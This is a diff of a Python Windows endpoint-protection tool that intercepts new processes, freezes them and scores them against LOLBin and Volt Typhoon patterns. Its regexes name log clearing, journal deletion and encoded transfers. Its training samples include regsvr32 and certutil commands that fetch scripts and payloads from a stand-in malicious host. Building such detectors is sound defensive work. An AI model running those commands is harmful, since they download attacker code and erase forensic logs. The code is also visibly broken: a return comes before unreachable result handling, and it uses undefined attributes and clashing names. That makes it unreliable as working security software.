@@ -1,17 +1,13 @@
-from entropy_analyzer import EntropyAnalyzer
-from vm_manager import VirtualBoxManager
-from ml_analyzer import MLThreatAnalyzer
-from process_analyzer import ProcessTreeAnalyzer
-from process_hook import ProcessInterceptor
-from behavioral_analyzer import BehavioralAnalyzer
-from lolbins_ml_integration import LOLBinsDatabase, EnhancedMLThreatAnalyzer
-from lolbin_commands import LOLBinsDetector
 import asyncio
 import json
 import time
 import logging
 import re
 import csv
+import ctypes
+import win32api
+import win32con
+import win32process
 from datetime import datetime
 import hashlib
 import os
@@ -19,9 +15,85 @@ import threading
 import queue
 import psutil
 import joblib
+import numpy as np
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
+from entropy_analyzer import EntropyAnalyzer
+from vm_manager import VirtualBoxManager
+from ml_analyzer import MLThreatAnalyzer
+from process_analyzer import ProcessTreeAnalyzer
+from behavioral_analyzer import BehavioralAnalyzer
+from lolbins_ml_integration import LOLBinsDatabase, EnhancedMLThreatAnalyzer
+from collections import defaultdict
+from lolbin_detector import LOLBinDetector
+import keyboard
+# Windows API imports for real-time monitoring
+kernel32 = ctypes.windll.kernel32
+psapi = ctypes.windll.psapi
+user32 = ctypes.windll.user32
 
+# Constants for Windows API
+PROCESS_CREATE_PROCESS = 0x0080
+THREAD_CREATE_THREAD = 0x0002
 
-
+class RealTimeProcessMonitor:
+    def __init__(self, callback):
+        self.callback = callback
+        self.running = False
+        self.hook = None
+        
+    def start(self):
+        self.running = True
+        threading.Thread(target=self._setup_hooks, daemon=True).start()
+        
+    def stop(self):
+        self.running = False
+        if self.hook:
+            user32.UnhookWindowsHookEx(self.hook)
+            
+    def _setup_hooks(self):
+    # Set CBT hook for process creation
+        CBTProc = ctypes.WINFUNCTYPE(
+            ctypes.c_long, ctypes.c_int, ctypes.c_long, ctypes.c_long
+        )
+        
+        def hook_cb(nCode, wParam, lParam):
+            if nCode == win32con.HCBT_CREATEWND:
+                try:
+                    pid = ctypes.c_ulong()
+                    thread_id = user32.GetWindowThreadProcessId(wParam, ctypes.byref(pid))
+                    self.callback(pid.value)
+                except Exception as e:
+                    logging.error(f"Hook error: {e}")
+            return user32.CallNextHookEx(self.hook, nCode, wParam, lParam)
+        
+        hook_proc = CBTProc(hook_cb)
+        self.hook = user32.SetWindowsHookExA(
+            win32con.WH_CBT,
+            hook_proc,
+            None,
+            0
+        )
+        
+        # Message loop using ctypes structure
+        class MSG(ctypes.Structure):
+            _fields_ = [
+                ("hwnd", ctypes.c_void_p),
+                ("message", ctypes.c_uint),
+                ("wParam", ctypes.c_ulong),
+                ("lParam", ctypes.c_ulong),
+                ("time", ctypes.c_ulong),
+                ("pt", ctypes.c_ulong)
+            ]
+        
+        msg = MSG()
+        pMsg = ctypes.pointer(msg)
+        
+        while self.running:
+            if user32.PeekMessageA(pMsg, 0, 0, 0, win32con.PM_REMOVE):
+                user32.TranslateMessage(pMsg)
+                user32.DispatchMessageA(pMsg)
+            time.sleep(0.01)
+                            
 class EnhancedVoltTyphoonDetector:
     def __init__(self):
         # Volt Typhoon specific command patterns
@@ -48,6 +120,9 @@ class EnhancedVoltTyphoonDetector:
                 r'dsquery\s+user',
                 r'dsquery\s+computer',
                 r'dsquery\s+group',
+                r'net\s+localgroup\s+administrators',
+                r'net\s+group\s+"domain\s+controllers"',
+                r'net\s+group\s+"enterprise\s+admins"'
             ],
             
             # Persistence mechanisms
@@ -80,9 +155,18 @@ class EnhancedVoltTyphoonDetector:
                 r'bcdedit\s+/set\s+safeboot',
                 r'attrib\s+\+s\s+\+h',
                 r'icacls\s+.*?/grant',
-                r'wevtutil\s+cl',
+                r'wevtutil\s+cl\s+system',
+                r'wevtutil\s+cl\s+security',
+                r'wevtutil\s+cl\s+application',
+                r'fsutil\s+usn\s+deletejournal',
                 r'net\s+stop\s+\w+',
                 r'net\s+start\s+\w+',
+                r'certutil.*?encode',
+            r'findstr.*?\/V.*?\-',
+            r'bitsadmin.*?\/transfer',
+            r'curl.*?\-X\s+POST',
+            r'schtasks.*?\\Microsoft\\Windows\\Diagnosis',
+            r'wevtutil.*?qe.*?EventID\=4624'
             ],
             
             # Discovery and enumeration
@@ -132,6 +216,9 @@ class EnhancedVoltTyphoonDetector:
             ('services.exe', 'svchost.exe', 'powershell.exe'),
             ('lsass.exe', 'cmd.exe', 'tasklist.exe'),
             ('spoolsv.exe', 'cmd.exe', 'sc.exe'),
+            ('svchost.exe', 'cmd.exe', 'reg.exe'),
+            ('explorer.exe', 'wscript.exe', 'cscript.exe'),
+            ('services.exe', 'cmd.exe', 'schtasks.exe')
         ]
         
         # Network indicators
@@ -143,7 +230,7 @@ class EnhancedVoltTyphoonDetector:
 
     def analyze_for_volt_typhoon(self, process_info, command_line):
         """Enhanced analysis specifically for Volt Typhoon TTPs"""
-        risk_score = 0
+        risk_score = 0.0
         detected_patterns = []
         
         cmd_lower = command_line.lower()
@@ -199,6 +286,8 @@ class EnhancedVoltTyphoonDetector:
                         'severity': 'HIGH'
                     })
                     break
+        
+        # Check for command chaining
         if re.search(r'(&&|\|\||;){2,}', command_line):
             risk_score += 1.5
             detected_patterns.append({
@@ -206,6 +295,15 @@ class EnhancedVoltTyphoonDetector:
                 'pattern': 'multiple_command_chaining',
                 'severity': 'MEDIUM'
             })
+        if not isinstance(process_info, dict):
+            logging.error(f"Expected dict, got {type(process_info)}: {process_info}")
+            return {
+                'volt_typhoon_risk_score': 0.0,
+                'detected_patterns': [],
+                'is_volt_typhoon_like': False
+            }    
+        
+        # Check for hex encoding
         if re.search(r'(0x[0-9a-fA-F]{2,}){4,}', command_line):
             risk_score += 1.5
             detected_patterns.append({
@@ -219,6 +317,7 @@ class EnhancedVoltTyphoonDetector:
             'detected_patterns': detected_patterns,
             'is_volt_typhoon_like': risk_score >= 3.0
         }
+        
     
     def get_extended_lolbins(self):
         """Extended LOLBins list including recent additions"""
@@ -240,25 +339,194 @@ class EnhancedVoltTyphoonDetector:
             'pnputil.exe', 'fltmc.exe', 'relog.exe', 'wusa.exe',
             'esentutl.exe', 'vsjitdebugger.exe', 'sqldumper.exe',
             'sqlps.exe', 'dtexec.exe', 'dnscmd.exe', 'dsacls.exe',
-            'ldifde.exe', 'csvde.exe', 'adplus.exe', 'appvlp.exe'
+            'ldifde.exe', 'csvde.exe', 'adplus.exe', 'appvlp.exe',
+            
+            # Additional high-risk LOLBins
+            'msbuild.exe', 'installutil.exe', 'regasm.exe', 'regsvcs.exe',
+            'msiexec.exe', 'cmstp.exe', 'control.exe'
         ]
 
+class ProcessInterceptor:
+    def __init__(self):
+        self.process_queue = queue.Queue(maxsize=1000)
+        self._seen = set()
+        self.running = False
+        self.real_time_monitor = RealTimeProcessMonitor(self._process_callback)
+        self.high_risk_processes ={p.lower(): d for p, d in {
+            # Scripting & Execution
+            'powershell.exe': 'PowerShell execution',
+            'cmd.exe': 'Command prompt execution',
+            'wmic.exe': 'WMI command execution',
+            'regsvr32.exe': 'Registry server execution',
+            'rundll32.exe': 'DLL execution',
+            'mshta.exe': 'HTML application execution',
+            'certutil.exe': 'Certificate utility execution',
+            'bitsadmin.exe': 'BITS admin execution',
+
+            # Scheduled tasks & persistence
+            'schtasks.exe': 'Scheduled task execution',
+            'at.exe': 'Legacy task scheduling',
+
+            # Network configuration & proxy abuse
+            'netsh.exe': 'Network configuration',
+            'proxycfg.exe': 'Proxy manipulation',
+            'ipconfig.exe': 'IP configuration view',
+            'route.exe': 'Routing table access',
+            'arp.exe': 'ARP cache dump',
+            'nbtstat.exe': 'NetBIOS network info',
+            'sc.exe': 'Service control',
+
+            # Recon & credential gathering
+            'net.exe': 'Network info & shares',
+            'net1.exe': 'Legacy network info',
+            'whoami.exe': 'Identity check',
+            'tasklist.exe': 'Process listing',
+            'dsquery.exe': 'AD domain queries',
+            'nltest.exe': 'Domain trust relationships',
+            'quser.exe': 'User session enumeration',
+            
+            # Additional high-risk LOLBins
+            'msbuild.exe': 'MSBuild script execution',
+            'installutil.exe': 'InstallUtil execution',
+            'regasm.exe': 'RegAsm execution',
+            'regsvcs.exe': 'RegSvcs execution',
+            'msiexec.exe': 'MSI package execution',
+            'cmstp.exe': 'Connection Manager execution',
+            'control.exe': 'Control Panel item execution'
+        }.items()}
+
+    def start_interception(self):
+        self.running = True
+        self.real_time_monitor.start()
+        threading.Thread(target=self._poll_processes, daemon=True).start()
+    def _process_callback(self, pid):
+        """Real-time callback for process creation"""
+        try:
+            proc = psutil.Process(pid)
+            with proc.oneshot():
+                cmdline = proc.cmdline()
+                process_data = {
+                    'name': proc.name(),
+                    'pid': pid,
+                    'ppid': proc.ppid(),
+                    'cmdline': ' '.join(cmdline) if cmdline else '',
+                    'is_high_risk': proc.name().lower() in self.high_risk_processes,
+                    'create_time': time.time()
+                }
+                self.process_queue.put(process_data)
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    def _poll_processes(self):
+        """Fallback polling for processes not caught by hook"""
+        while self.running:
+            try:
+                current_pids = set(psutil.pids())
+                new_pids = current_pids - self._seen
+                for pid in new_pids:
+                    try:
+                        proc = psutil.Process(pid)
+                        if pid not in self._seen and proc.create_time() > time.time() - 1:
+                            self._process_callback(pid)
+                    except Exception:
+                        pass
+                self._seen = current_pids
+            except Exception as e:
+                logging.error(f"Polling error: {e}")
+            time.sleep(0.05) 
+
+class LOLBinPatternDetector:
+    def __init__(self):
+        from lolbin_detector import LOLBIN_PATTERNS, WHITELIST_PATTERNS
+        self.patterns = LOLBIN_PATTERNS
+        self.whitelist_patterns = WHITELIST_PATTERNS
+
+    def detect(self, process_name, command_line):
+        proc_name = process_name.lower()
+        cmd_lower = command_line.lower()
+        
+        # Check if process has defined patterns
+        if proc_name not in self.patterns:
+            return False, None
+        
+        # Check whitelist patterns first
+        if proc_name in self.whitelist_patterns:
+            for pattern in self.whitelist_patterns[proc_name]:
+                if re.search(pattern, cmd_lower):
+                    return False, None  # Whitelisted pattern match
+        
+        # Check malicious patterns
+        for pattern in self.patterns[proc_name]:
+            if re.search(pattern, cmd_lower):
+                return True, pattern  # Malicious pattern match
+        
+        return False, None
+class AdaptiveSemaphore:
+    """Semaphore that adjusts based on system load"""
+    def __init__(self, min_tasks=5, max_tasks=50, load_factor=0.7):
+        self.min_tasks = min_tasks
+        self.max_tasks = max_tasks
+        self.load_factor = load_factor
+        self.semaphore = asyncio.Semaphore(min_tasks)
+        self.adjust_task = None
+    async def start_adjusting(self):  # New method to start adjustment
+        self.adjust_task = asyncio.create_task(self._adjust_loop())
+        
+    async def stop_adjusting(self):  # New method to stop adjustment
+        if self.adjust_task:
+            self.adjust_task.cancel()
+            try:
+                await self.adjust_task
+            except asyncio.CancelledError:
+                pass    
+    async def _adjust_loop(self):
+        while True:
+            await asyncio.sleep(5)  # Adjust every 5 seconds
+            cpu_load = psutil.cpu_percent() / 100.0
+            current_value = self.semaphore._value
+            
+            if cpu_load < self.load_factor and current_value < self.max_tasks:
+                # Increase concurrency
+                for _ in range(min(5, self.max_tasks - current_value)):
+                    self.semaphore.release()
+            elif cpu_load > self.load_factor and current_value > self.min_tasks:
+                # Decrease concurrency
+                for _ in range(min(5, current_value - self.min_tasks)):
+                    await self.semaphore.acquire()
+                    
+    async def acquire(self):
+        await self.semaphore.acquire()
+        
+    def release(self):
+        self.semaphore.release()
+        
+    async def __aenter__(self):
+        await self.acquire()
+        
+    async def __aexit__(self, exc_type, exc, tb):
+        self.release()
 
 class SecurityGateway:
     def __init__(self):
         self.process_interceptor = ProcessInterceptor()
+        self.lolbin_detector = LOLBinDetector()
         self.vm_manager = VirtualBoxManager()
         self.entropy_analyzer = EntropyAnalyzer()
         self.process_analyzer = ProcessTreeAnalyzer()
         self.lolbins_db = LOLBinsDatabase('full_lolbins_raw.txt')
         self.ml_analyzer = EnhancedMLThreatAnalyzer(self.lolbins_db)
         self.volt_detector = EnhancedVoltTyphoonDetector()
-        self.lolbins_detector = LOLBinsDetector()
-        self.lolbins_detector.load_model("lolbins_detector.pkl")
-        
+        self.behavioral_analyzer = BehavioralAnalyzer()
+        #self.lolbin_pattern_detector = LOLBinPatternDetector()
+        # Parallel execution setup
+        self.cpu_thread_pool = ThreadPoolExecutor(max_workers=os.cpu_count() * 2)
+        self.io_thread_pool = ThreadPoolExecutor(max_workers=50)
+        self.adaptive_semaphore = AdaptiveSemaphore()
+        self.active_tasks = set()
+        self.monitoring_active = False
+
         # Cache for analyzed operations
         self.analysis_cache = {}
-        self.cache_ttl = 3600  # 1 hour
+        self.cache_ttl = 3600
         
         # Risk thresholds
         self.risk_thresholds = {
@@ -267,8 +535,8 @@ class SecurityGateway:
             'block': 8.0
         }
         
-        # Active monitoring
-        self.monitoring_active = False
+        # Runtime blocklist
+        self.runtime_blocklist = []
         
         # Setup logging
         logging.basicConfig(
@@ -280,21 +548,181 @@ class SecurityGateway:
             ]
         )
         self.logger = logging.getLogger(__name__)
-        
-    async def start_protection(self):
-        """Start the security gateway"""
-        self.logger.info("Starting Security Gateway...")
-        
-        # Load or train ML model
-        await self._initialize_ml_model()
+    def start_keyboard_monitor(self):
+    
+        def monitor():
+            print("🔴 Press ESC to stop the Security Gateway.")
+            keyboard.wait("esc")
+            self.logger.info("ESC key pressed. Shutting down.")
+            self.monitoring_active = False
+            self.process_interceptor.running = False
+            self.process_interceptor.real_time_monitor.stop()
+
+        threading.Thread(target=monitor, daemon=True).start()
+    async def process_analyzer(self, queue):
+        while True:
+            try:
+                item = await queue.get()
+                if item is None:  # Handle shutdown signal
+                    break
+                
+                pid, process_name, command_line, creation_time = item
+                # Add type checking for OpenConsole.exe
+                if process_name.lower() == "openconsole.exe":
+                    self.logger.info(f"Skipping analysis for OpenConsole.exe (PID: {pid})")
+                    queue.task_done()
+                    continue
                     
+                self.logger.info(f"Analyzing process: {process_name} (PID: {pid})")
+                detection_result = self.lolbin_detector.detect(process_name, command_line)
+                
+                # Handle different return types
+                if isinstance(detection_result, dict) and detection_result.get('detected'):
+                    # Process detection logic
+                    self.logger.critical(f"LOLBin detected: {process_name} with pattern {detection_result.get('matched_pattern')}")
+                    try:
+                        self._terminate_process_tree(pid)
+                        self._add_to_blocklist(process_name, command_line)
+                    except Exception as e:
+                        self.logger.error(f"Error blocking process {pid}: {e}")
+                elif detection_result is None:
+                    # Not detected - allow process
+                    self.logger.info(f"No LOLBin detected for {process_name} (PID: {pid}), unfreezing.")
+                    await self._unfreeze_process(pid)
+                else:
+                    self.logger.warning(f"Unexpected detection result type: {type(detection_result)}")
+                    await self._unfreeze_process(pid)  # Unfreeze as precaution
+                
+                queue.task_done()
+            except Exception as e:
+                self.logger.error(f"Consumer error: {e}")
+                queue.task_done()
+
+    async def on_process_event(self, pid, process_name, command_line):
+        process_name_lower = process_name.lower()
+        
+        # Add sppsvc.exe to protected processes
+        protected = ["csrss.exe", "wininit.exe", "services.exe", 
+                    "lsass.exe", "svchost.exe", "taskhostw.exe",
+                    "conhost.exe", "sppsvc.exe"]
+        
+        if process_name_lower in protected:
+            self.logger.info(f"Skipping protected process: {process_name} (PID: {pid})")
+            return
+
+        try:
+            # Freeze process
+            self.process_freeze.freeze(pid)
+            self.logger.info(f"Froze process {pid}")
+        except Exception as e:
+            self.logger.error(f"Failed to freeze process {pid}: {e}")
+            self.block_process(pid, "Failed to freeze - high risk")
+            return
+
+        # Send for analysis
+        await self.analysis_queue.put((pid, process_name, command_line, time.time()))
+    async def _run_cpu_bound(self, func, *args):
+        """Run CPU-bound tasks in thread pool"""
+        loop = asyncio.get_running_loop()
+        return await loop.run_in_executor(self.cpu_thread_pool, func, *args)
+
+    async def _run_io_bound(self, func, *args):
+        """Run I/O-bound tasks in thread pool"""
+        loop = asyncio.get_running_loop()
+        return await loop.run_in_executor(self.io_thread_pool, func, *args)
+
+    async def _gather_initial_analyses(self, process_info):
+        """Run initial analyses in parallel"""
+        name = process_info['name']
+        cmdline = process_info.get('cmdline', '')
+        pid = process_info['pid']
+        
+        # Create analysis tasks
+        tasks = [
+            self._run_cpu_bound(self.lolbin_detector.detect, name, cmdline),
+            self._run_cpu_bound(
+                self.volt_detector.analyze_for_volt_typhoon, 
+                process_info, 
+                cmdline
+            ),
+            self._run_io_bound(self.process_analyzer.analyze_process_chain, pid),
+            self._run_cpu_bound(
+                self.behavioral_analyzer.analyze_command, 
+                cmdline
+            )
+        ]
+        try:
+        # Run all tasks concurrently
+            return await asyncio.gather(*tasks, return_exceptions=True)
+            processed_results = []
+            for res in results:
+                if isinstance(res, Exception):
+                    logging.error(f"Analysis failed: {res}")
+                    processed_results.append({})  # Default empty result
+                else:
+                    processed_results.append(res)
+                    
+            return processed_results
+        except Exception as e:
+            logging.error(f"Gather error: {e}")
+            return [{}, {}, {}, {}]
+    
+    async def start_protection(self):
+        self.logger.info("Starting Security Gateway...")
+        self.start_keyboard_monitor()
+        
+        # Initialize ML model
+        await self._initialize_ml_model()
+        
+        # Start adaptive semaphore
+        await self.adaptive_semaphore.start_adjusting()  # Start adjustment task
+        
         # Start process interception
         self.process_interceptor.start_interception()
         self.monitoring_active = True
         
-        # Main monitoring loop
-        await self._monitoring_loop()
+        # Create consumers
+        consumer_tasks = [asyncio.create_task(self._process_consumer()) 
+                        for _ in range(os.cpu_count())]
+        self.active_tasks.update(consumer_tasks)
         
+        try:
+            while self.monitoring_active:
+                await asyncio.sleep(1)
+        finally:
+            self.logger.info("Shutting down Security Gateway...")
+            await self.adaptive_semaphore.stop_adjusting()
+            self.process_interceptor.running = False
+            self.process_interceptor.real_time_monitor.stop()
+            
+            for task in consumer_tasks:
+                task.cancel()
+            await asyncio.gather(*consumer_tasks, return_exceptions=True)
+
+            self.cpu_thread_pool.shutdown(wait=True)
+            self.io_thread_pool.shutdown(wait=True)
+
+            self.logger.info("Security Gateway stopped cleanly")
+
+    async def _process_consumer(self):
+        """Consumer task for processing intercepted processes"""
+        while self.monitoring_active:
+            try:
+                # Get process from queue with timeout
+                process_info = await asyncio.get_event_loop().run_in_executor(
+                    self.io_thread_pool,
+                    lambda: self.process_interceptor.process_queue.get(timeout=0.1)
+                )
+                
+                # Process with adaptive concurrency control
+                async with self.adaptive_semaphore:
+                    await self._handle_intercepted_process(process_info)
+                    
+            except queue.Empty:
+                await asyncio.sleep(0.01)
+            except Exception as e:
+                self.logger.error(f"Consumer error: {e}")
+                       
     async def _initialize_ml_model(self):
         """Initialize ML model - load existing or train new one"""
         if not os.path.exists("ml_model.pkl"):
@@ -324,114 +752,137 @@ class SecurityGateway:
                 {"name": "regsvr32.exe", "cmdline": ["regsvr32.exe", "/s", "/n", "/u", "/i:http://malicious.example.com/script.sct", "scrobj.dll"]},
             ]
 
-            # Read all LOLBins
-            with open("all_lolbins.txt", encoding="utf-8") as f:
-                all_lolbins = [line.strip() for line in f if line.strip()]
-
-            # Benign and malicious templates
-            benign_templates = [
-                ["{bin}"],  # Just running the binary
-                ["{bin}", "/?"],  # Help
-                ["{bin}", "-h"],  # Help
-            ]
-            malicious_templates = [
-                # Volt Typhoon/LOLBins TTPs
-                ["{bin}", "-windowstyle", "hidden", "-encodedcommand", "aGVsbG8="],
-                ["{bin}", "/c", "netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.1 connectport=80"],
-                ["{bin}", "/create", "/sc", "onlogon", "/tn", "vt-task", "/tr", "cmd.exe /c whoami"],
-                ["{bin}", "-urlcache", "-split", "-f", "http://malicious.example.com/payload.exe", "payload.exe"],
-                ["{bin}", "/s", "/n", "/u", "/i:http://malicious.example.com/script.sct", "scrobj.dll"],
-            ]
-
-            sample_normal_processes = []
-            for bin in all_lolbins:
-                for tpl in benign_templates:
-                    sample_normal_processes.append({"name": bin, "cmdline": [arg.format(bin=bin) for arg in tpl]})
-                for tpl in malicious_templates:
-                    sample_normal_processes.append({"name": bin, "cmdline": [arg.format(bin=bin) for arg in tpl]})
-            
             if self.ml_analyzer.train_baseline(sample_normal_processes):
                 self.ml_analyzer.save_model("ml_model.pkl")
                 self.logger.info("Model trained and saved as ml_model.pkl")
             else:
                 self.logger.error("Failed to train model — no valid baseline data.")
         else:
-            self.logger.info("Loading existing ML model...")
-            if self.ml_analyzer.load_model("ml_model.pkl"):
+           self.logger.info("Loading existing ML model...")
+           if self.ml_analyzer.load_model("ml_model.pkl"):
                 self.logger.info("ML model loaded successfully")
-            else:
+           else:
                 self.logger.error("Failed to load existing ML model")
         
     async def _monitoring_loop(self):
-        """Main monitoring loop"""
+        """Main monitoring loop with concurrent task handling"""
         while self.monitoring_active:
             try:
-                # Check for intercepted processes
-                if not self.process_interceptor.process_queue.empty():
+                while not self.process_interceptor.process_queue.empty():
                     process_info = self.process_interceptor.process_queue.get()
-                    await self._handle_intercepted_process(process_info)
+                    task = asyncio.create_task(self._process_with_semaphore(process_info))
+                    self.active_tasks.add(task)
+                    task.add_done_callback(self.active_tasks.discard)
                     
-                await asyncio.sleep(0.1)  # Small delay to prevent CPU spinning
-                
+                await asyncio.sleep(1)
+                self.logger.info("Monitoring loop exited. Shutting down.")
+
             except Exception as e:
                 self.logger.error(f"Error in monitoring loop: {e}")
                 await asyncio.sleep(1)
-                
+    async def _process_with_semaphore(self, process_info):
+        """Handle process with concurrency control"""
+        async with self.semaphore:
+            await self._handle_intercepted_process(process_info)
+                    
     async def _handle_intercepted_process(self, process_info):
-        """Handle an intercepted process"""
-        self.logger.info(f"Intercepted process: {process_info['name']} (PID: {process_info['pid']})")
+        """Handle an intercepted process with real-time freezing"""
         pid = process_info['pid']
+        name = process_info['name']
+        self.logger.info(f"Intercepted process: {name} (PID: {pid})")
         
-        # Skip system processes
-        system_names = {
-            "System Idle Process", "System", "Registry", "smss.exe", "csrss.exe", "wininit.exe",
-            "services.exe", "lsass.exe", "svchost.exe", "winlogon.exe", "explorer.exe",
-            "fontdrvhost.exe", "dwm.exe", "ctfmon.exe", "spoolsv.exe", "RuntimeBroker.exe",
-            "ShellExperienceHost.exe", "SearchIndexer.exe", "StartMenuExperienceHost.exe",
-            "conhost.exe", "taskhostw.exe", "AggregatorHost.exe", "LsaIso.exe", "msedgewebview2.exe"
-        }
-        if process_info['name'] in system_names or process_info['pid'] == 0 or process_info['pid'] == 4:
-            self.logger.info(f"Skipping system process: {process_info['name']} (PID: {process_info['pid']})")
+        # Initialize analysis_result to avoid reference errors
+        analysis_result = None
+        
+        # Skip system and protected processes
+        if self._should_skip_process(process_info):
             return
         
-        try:
-            proc = psutil.Process(pid)
-            proc.suspend()  # Immediately suspend the process
-        except Exception as e:
-            self.logger.error(f"Failed to suspend process {pid} for analysis: {e}")
-
-        # Generate cache key
-        cache_key = self._generate_cache_key(process_info)
+        # Freeze process immediately
+        if not await self._freeze_process(pid):
+            self.logger.error(f"Failed to freeze process {pid}. Blocking as precaution.")
+            await self._block_process(process_info, {'reason': 'freeze_failure'})
+            return
+         # Early LOLBin pattern detection
+        name = process_info['name']
+        cmdline = process_info.get('cmdline', '')
+        is_malicious, pattern = self.lolbin_detector.detect(name, cmdline)
         
-        # Check cache first
-        if cache_key in self.analysis_cache:
-            cached_result = self.analysis_cache[cache_key]
-            if time.time() - cached_result['timestamp'] < self.cache_ttl:
-                self.logger.info(f"Using cached result for {process_info['name']}")
-                await self._make_decision(process_info, cached_result['analysis'])
+        if is_malicious:
+            self.logger.critical(f"Blocking LOLBin pattern match: {name} - {pattern}")
+            await self._block_process(process_info, {
+                'detected_patterns': [f'lolbin_pattern:{pattern}'],
+                'immediate_block': True
+            })
+            return  # Skip further analysis
+        # Check if process is high-risk            
+        try:
+            # Check runtime blocklist
+            if self._is_blocklisted(process_info):
+                self.logger.warning(f"Blocking blocklisted process: {name}")
+                await self._block_process(process_info, {'detected_patterns': ['runtime_blocklist_match']})
                 return
                 
-        # Perform full analysis
-        analysis_result = await self._analyze_process(process_info)
-        
-        # Cache result
-        self.analysis_cache[cache_key] = {
-            'analysis': analysis_result,
-            'timestamp': time.time()
+            # Generate cache key
+            cache_key = self._generate_cache_key(process_info)
+            
+            # Check cache
+            if cache_key in self.analysis_cache:
+                cached_result = self.analysis_cache[cache_key]
+                if time.time() - cached_result['timestamp'] < self.cache_ttl:
+                    self.logger.info(f"Using cached result for {name}")
+                    await self._make_decision(process_info, cached_result['analysis'])
+                    return
+                    
+            # Perform full analysis
+            analysis_result = await self._analyze_process(process_info)
+            
+            # Cache result
+            self.analysis_cache[cache_key] = {
+                'analysis': analysis_result,
+                'timestamp': time.time()
+            }
+            
+            # Make decision
+            await self._make_decision(process_info, analysis_result)
+            
+        except Exception as e:
+            self.logger.error(f"Error handling process {pid}: {e}")
+            # If analysis fails, block the process as precaution
+            await self._block_process(process_info, {'error': str(e)})
+        finally:
+            # If we allowed the process, resume it
+            if analysis_result and analysis_result.get('final_decision') == 'ALLOW':
+                await self._unfreeze_process(pid)
+    def _should_skip_process(self, process_info):
+        """Determine if a process should be skipped from analysis"""
+        protected_names = {
+            "System Idle Process", "System", "Registry", "smss.exe", "csrss.exe", 
+            "wininit.exe", "services.exe", "lsass.exe", "svchost.exe", "winlogon.exe",
+            "explorer.exe", "fontdrvhost.exe", "dwm.exe", "ctfmon.exe", "spoolsv.exe",
+            "RuntimeBroker.exe", "ShellExperienceHost.exe", "SearchIndexer.exe", 
+            "StartMenuExperienceHost.exe", "conhost.exe", "taskhostw.exe", 
+            "AggregatorHost.exe", "LsaIso.exe", "msedgewebview2.exe", 
+            "MpDefenderCoreService.exe", "MsMpEng.exe", "NisSrv.exe", "Widgets.exe",
+            "NgcIso.exe", "sihost.exe", "ShellHost.exe", "python.exe", "chrome.exe", 
+            "firefox.exe", "notepad.exe", "calc.exe", "MemCompression"
         }
         
-        # Make decision
-        await self._make_decision(process_info, analysis_result)
+        if (process_info['name'] in protected_names or 
+            process_info['pid'] in (0, 4, os.getpid())):
+            self.logger.info(f"Skipping protected process: {process_info['name']} (PID: {process_info['pid']})")
+            return True
+        return False                        
+    def _is_blocklisted(self, process_info):
+        """Check if process matches runtime blocklist"""
+        name = process_info['name'].lower()
+        cmdline = process_info.get('cmdline', '').lower()
         
-        # After decision:
-        decision = analysis_result.get('final_decision', 'ALLOW')
-        if decision == 'ALLOW':
-            try:
-                proc.resume()  # Resume only if allowed
-                self.logger.info(f"Process {pid} resumed after allow decision.")
-            except Exception as e:
-                self.logger.error(f"Failed to resume process {pid}: {e}")
-        # If not allowed, process remains suspended or is terminated/quarantined as per your logic.
+        for entry in self.runtime_blocklist:
+            if entry['name'] == name:
+                if any(pattern in cmdline for pattern in entry['cmdline_patterns']):
+                    return True
+        return False
         
     def _generate_cache_key(self, process_info):
         """Generate cache key for process"""
@@ -439,165 +890,321 @@ class SecurityGateway:
         return hashlib.md5(key_data.encode()).hexdigest()
         
     async def _analyze_process(self, process_info):
-        """Comprehensive process analysis"""
+        """Refactored comprehensive parallel process analysis"""
         analysis_start = time.time()
         analysis_results = {
             'timestamp': datetime.now().isoformat(),
             'process_info': process_info,
-            'analyses': {}
+            'analyses': {},
+            'final_risk_score': 0.0,
+            'final_decision': 'ALLOW'
         }
-        
+
         try:
-            # 1. Process tree analysis
-            tree_analysis = self.process_analyzer.analyze_process_chain(process_info['pid'])
-            analysis_results['analyses']['process_tree'] = tree_analysis
+            # Run parallel analysis components
+            results = await self._gather_initial_analyses(process_info)
+            lolbin_result, volt_result, tree_result, behavioral_result = results
             
-            # 2. ML-based analysis
-            ml_analysis = self.ml_analyzer.predict_threat(process_info)
+            # Unpack and store results
+            analysis_results['analyses'].update({
+                'lolbin': lolbin_result,
+                'volt_typhoon': volt_result,
+                'process_tree': tree_result
+            })
+            
+            # Handle behavioral analysis result
+            if isinstance(behavioral_result, tuple):
+                threat_level, confidence, flags = behavioral_result
+                analysis_results['analyses']['behavioral'] = {
+                    'threat_level': threat_level,
+                    'confidence': confidence,
+                    'flags': flags
+                }
+            else:
+                analysis_results['analyses']['behavioral'] = {
+                    'threat_level': 0,
+                    'confidence': 0.0,
+                    'flags': []
+                }
+            
+            # Prepare and run ML analysis
+            ml_features = {
+                **process_info,
+                'is_lolbin': bool(lolbin_result and lolbin_result.get('detected')),
+                'lolbin_severity': lolbin_result.get('severity') if lolbin_result else 'none'
+            }
+            ml_analysis = await self._run_cpu_bound(
+                self.ml_analyzer.predict_threat, 
+                ml_features
+            )
             analysis_results['analyses']['ml_prediction'] = ml_analysis
             
-            # 3. Volt Typhoon specific analysis
-            command_line = process_info.get('cmdline', '')
-            volt_analysis = self.volt_detector.analyze_for_volt_typhoon(process_info, command_line)
-            analysis_results['analyses']['volt_typhoon'] = volt_analysis
+            # Run conditional sandbox analysis
+            analysis_results['analyses']['sandbox'] = await self._run_sandbox_analysis(
+                process_info, 
+                lolbin_result, 
+                ml_analysis
+            )
+            
+            # Final risk calculation
+            analysis_results['final_risk_score'] = self._calculate_final_risk(
+                analysis_results['analyses']
+            )
+            
+            # Special case: Multiple LOLBins in command chain
+            cmdline = process_info.get('cmdline', '').lower()
+            if self._detect_lolbin_chaining(cmdline):
+                analysis_results['final_risk_score'] = min(
+                    analysis_results['final_risk_score'] + 3.0, 
+                    10.0
+                )
+                analysis_results['analyses']['lolbin_chaining'] = True
 
-            # 4. LOLBins ML-based analysis
-            cmdline_str = process_info.get('cmdline', '')
-            lolbins_pred, lolbins_prob = self.lolbins_detector.predict([cmdline_str])
-            analysis_results['analyses']['lolbins_ml'] = {
-                'prediction': int(lolbins_pred[0]),
-                'probability': float(lolbins_prob[0])
-            }
-            
-            # --- Pattern match logic: if pattern matches, set risk high ---
-            if volt_analysis.get('is_volt_typhoon_like') or analysis_results['analyses']['lolbins_ml']['prediction'] == 1:
-                # Force high risk to trigger block
-                analysis_results['final_risk_score'] = 10.0
